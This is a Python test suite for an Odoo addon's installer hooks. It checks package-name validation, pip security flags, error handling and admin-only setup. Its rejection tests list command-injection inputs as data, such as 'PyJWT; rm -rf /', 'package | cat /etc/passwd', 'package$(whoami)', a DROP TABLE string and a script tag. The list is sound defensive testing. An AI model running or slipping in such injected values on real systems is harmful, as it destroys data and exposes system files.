# -*- coding: utf-8 -*-

from odoo.tests import TransactionCase, tagged
from odoo.exceptions import AccessError
from unittest.mock import patch, MagicMock
import subprocess


@tagged("post_install", "-at_install")  
class TestSecurityHooks(TransactionCase):
    """Test suite for security-related functionality in hooks"""

    def setUp(self):
        super().setUp()

    def test_package_name_validation_valid_packages(self):
        """Test that valid package names are accepted"""
        from odoo.addons.clinic_installer.hooks import _validate_package_name
        
        valid_packages = [
            "PyJWT",
            "PyJWT>=2.8.0", 
            "cryptography>=41.0.0",
            "requests",
            "phonenumbers>=8.13.0",
            "some-package",
            "package_name",
            "Package.Name",
            "package==1.0.0",
            "package<=2.0.0",
            "package!=1.5.0"
        ]
        
        for package in valid_packages:
            try:
                result = _validate_package_name(package)
                self.assertIsInstance(result, str)
                # Should return base package name
                self.assertNotIn('>=', result)
                self.assertNotIn('==', result)
            except ValueError:
                self.fail(f"Valid package name rejected: {package}")

    def test_package_name_validation_invalid_packages(self):
        """Test that invalid/malicious package names are rejected"""
        from odoo.addons.clinic_installer.hooks import _validate_package_name
        
        # Potential injection attempts
        invalid_packages = [
            "PyJWT; rm -rf /",
            "requests && curl malicious.com",
            "../../../etc/passwd",
            "package | cat /etc/passwd",
            "package`rm -rf /`",
            "package$(whoami)",
            "package || echo 'hacked'",
            "package\n\nrm -rf /",
            "package''; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "package with spaces",  # spaces not allowed
            "",  # empty string
            "package@malicious.com",  # @ not allowed
            "package*",  # * not allowed
        ]
        
        for package in invalid_packages:
            with self.assertRaises(ValueError, msg=f"Should reject malicious package: {package}"):
                _validate_package_name(package)

    def test_package_name_base_extraction(self):
        """Test that base package names are extracted correctly"""
        from odoo.addons.clinic_installer.hooks import _validate_package_name
        
        test_cases = [
            ("PyJWT>=2.8.0", "PyJWT"),
            ("cryptography==41.0.0", "cryptography"), 
            ("requests!=2.30.0", "requests"),
            ("phonenumbers<=8.13.0", "phonenumbers"),
            ("simple-package", "simple-package"),
        ]
        
        for package_spec, expected_base in test_cases:
            result = _validate_package_name(package_spec)
            self.assertEqual(result, expected_base)

    @patch('subprocess.check_call')
    @patch('odoo.addons.clinic_installer.hooks.__import__')
    def test_check_python_dependencies_security_flags(self, mock_import, mock_subprocess):
        """Test that pip install uses security flags"""
        from odoo.addons.clinic_installer.hooks import check_python_dependencies
        
        # Mock import to fail (simulate missing package)
        mock_import.side_effect = ImportError("Module not found")
        
        # Should attempt to install with security flags
        check_python_dependencies()
        
        # Verify subprocess was called with security flags
        self.assertTrue(mock_subprocess.called)
        
        # Check that security flags are present
        call_args = mock_subprocess.call_args_list
        for call in call_args:
            cmd = call[0][0]  # First positional argument is the command
            self.assertIn('--user', cmd)  # Install to user directory
            self.assertIn('--no-deps', cmd)  # Don't install dependencies
            self.assertIn('--timeout', cmd)  # Include timeout

    @patch('subprocess.check_call')
    def test_subprocess_timeout_handling(self, mock_subprocess):
        """Test that subprocess timeouts are handled properly"""
        from odoo.addons.clinic_installer.hooks import check_python_dependencies
        
        # Mock subprocess to raise TimeoutExpired
        mock_subprocess.side_effect = subprocess.TimeoutExpired(['pip'], timeout=300)
        
        with self.assertRaises(Exception) as cm:
            check_python_dependencies()
        
        self.assertIn("timeout", str(cm.exception).lower())

    @patch('subprocess.check_call')
    def test_subprocess_error_handling(self, mock_subprocess):
        """Test that subprocess errors are handled securely"""
        from odoo.addons.clinic_installer.hooks import check_python_dependencies
        
        # Mock subprocess to raise CalledProcessError
        mock_subprocess.side_effect = subprocess.CalledProcessError(1, ['pip'])
        
        with self.assertRaises(Exception) as cm:
            check_python_dependencies()
        
        self.assertIn("safely install", str(cm.exception))

    @patch('odoo.api.Environment')
    def test_post_init_hook_admin_check(self, mock_env):
        """Test that post_init_hook validates admin permissions"""
        from odoo.addons.clinic_installer.hooks import post_init_hook
        
        # Mock environment and user
        mock_registry = MagicMock()
        mock_cr = MagicMock()
        mock_user = MagicMock()
        mock_env_instance = MagicMock()
        
        # Configure mock to return non-admin user
        mock_env.return_value = mock_env_instance
        mock_env_instance.user = mock_user
        mock_user.has_group.return_value = False
        
        # Should raise AccessError for non-admin user
        with self.assertRaises(AccessError):
            post_init_hook(mock_cr, mock_registry)
        
        # Verify has_group was called with correct group
        mock_user.has_group.assert_called_with('base.group_system')

    @patch('odoo.api.Environment')
    def test_post_init_hook_safe_mode(self, mock_env):
        """Test that post_init_hook respects safe mode configuration"""
        from odoo.addons.clinic_installer.hooks import post_init_hook
        
        # Mock environment and user (admin)
        mock_registry = MagicMock()
        mock_cr = MagicMock()
        mock_user = MagicMock()
        mock_env_instance = MagicMock()
        mock_config = MagicMock()
        
        # Configure mocks
        mock_env.return_value = mock_env_instance
        mock_env_instance.user = mock_user
        mock_user.has_group.return_value = True  # Admin user
        
        # Mock config parameter access
        mock_env_instance.__getitem__.return_value.sudo.return_value = mock_config
        mock_config.get_param.return_value = 'true'
        
        # Mock module search to return empty result
        mock_env_instance.__getitem__.return_value.search.return_value = []
        
        # Should execute without errors in safe mode
        try:
            post_init_hook(mock_cr, mock_registry)
        except Exception:
            self.fail("post_init_hook raised exception unexpectedly")
        
        # Verify safe mode parameter was checked
        mock_config.get_param.assert_called_with('clinic_installer.safe_mode', 'true')

    def test_required_packages_list_integrity(self):
        """Test that required packages list hasn't been tampered with"""
        from odoo.addons.clinic_installer.hooks import REQUIRED_PYTHON_PACKAGES
        
        # Verify expected packages are present
        expected_packages = {
            'PyJWT>=2.8.0',
            'cryptography>=41.0.0',
            'requests>=2.31.0',
            'phonenumbers>=8.13.0'
        }
        
        actual_packages = set(REQUIRED_PYTHON_PACKAGES)
        self.assertEqual(actual_packages, expected_packages)

    def test_package_validation_regex_pattern(self):
        """Test that regex pattern is properly configured"""
        from odoo.addons.clinic_installer.hooks import _PKG_VALIDATION_REGEX
        
        # Test valid patterns
        valid_patterns = [
            'package',
            'package-name',
            'package_name',
            'Package.Name',
            'package>=1.0.0',
            'package==1.2.3',
            'package<=2.0.0',
            'package!=1.5.0'
        ]
        
        for pattern in valid_patterns:
            self.assertTrue(_PKG_VALIDATION_REGEX.match(pattern), 
                          f"Should match valid pattern: {pattern}")
        
        # Test invalid patterns
        invalid_patterns = [
            'package; rm -rf /',
            'package && echo hack',
            'package | cat /etc/passwd',
            'package$(whoami)',
            'package with spaces',
            'package@evil.com'
        ]
        
        for pattern in invalid_patterns:
            self.assertFalse(_PKG_VALIDATION_REGEX.match(pattern),
                           f"Should NOT match invalid pattern: {pattern}")